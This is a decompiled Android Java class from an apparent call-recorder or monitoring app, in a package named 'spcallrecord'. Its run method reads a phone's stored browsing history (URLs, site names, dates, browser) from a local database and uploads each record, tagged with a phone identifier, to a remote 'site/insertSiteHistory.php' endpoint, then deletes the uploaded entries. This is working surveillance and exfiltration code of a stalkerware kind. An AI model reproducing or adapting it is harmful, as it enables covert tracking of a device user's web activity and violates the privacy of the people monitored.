package com.yasoka.spcallrecord.recorder.call.a.c.i;

import a.c.b.K;
import a.c.b.m0;
import a.c.e.a;
import a.c.e.e;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import com.app.service.UploadDataService;
import com.crashlytics.android.Crashlytics;
import java.util.HashMap;
import java.util.Map;

/* compiled from: SendSiteHistory */
public class p implements Runnable {

    /* renamed from: b reason: collision with root package name */
    public static boolean f291b;

    /* renamed from: a reason: collision with root package name */
    private final Context f292a;

    public p(Context context) {
        this.f292a = context;
    }

    private void a() {
        try {
            UploadDataService.b();
            StringBuilder sb = new StringBuilder();
            sb.append("UploadDataService.getmNbTask() : ");
            sb.append(UploadDataService.f1272b);
            sb.toString();
            if (UploadDataService.f1272b <= 0) {
                this.f292a.stopService(new Intent(this.f292a, UploadDataService.class));
            }
        } catch (Throwable th) {
            try {
                th.getStackTrace();
                Crashlytics.logException(th);
            } catch (Exception unused) {
            }
        }
    }

    /* JADX WARNING: Exception block dominator not found, dom blocks: [] */
    /* JADX WARNING: Missing exception handler attribute for start block: B:26:0x00bd */
    public synchronized void run() {
        try {
            if (f291b) {
                a();
                return;
            }
            f291b = true;
            m0 m0Var = new m0(this.f292a);
            m0Var.b();
            Cursor c2 = m0Var.c();
            if (c2 != null && c2.getCount() > 0) {
                while (c2.moveToNext()) {
                    K k = new K();
                    k.a(c2.getInt(0));
                    k.d(c2.getString(1));
                    k.c(c2.getString(2));
                    k.b(c2.getString(3));
                    k.a(c2.getString(4));
                    HashMap hashMap = new HashMap();
                    StringBuilder sb = new StringBuilder();
                    sb.append("");
                    sb.append(e.e(this.f292a));
                    hashMap.put("idPhone", sb.toString());
                    hashMap.put("url", k.e());
                    hashMap.put("nameSite", k.d());
                    hashMap.put("dateUsed", k.b());
                    hashMap.put("browser", k.a());
                    if (a.b("site/insertSiteHistory.php", (Map<String, String>) hashMap)) {
                        m0Var.a(k.c());
                    }
                }
            }
            m0Var.a();
            if (c2 != null) {
                c2.close();
            }
            f291b = false;
            a();
        } catch (Exception e2) {
            e2.getStackTrace();
            Crashlytics.logException(e2);
        }
    }
}
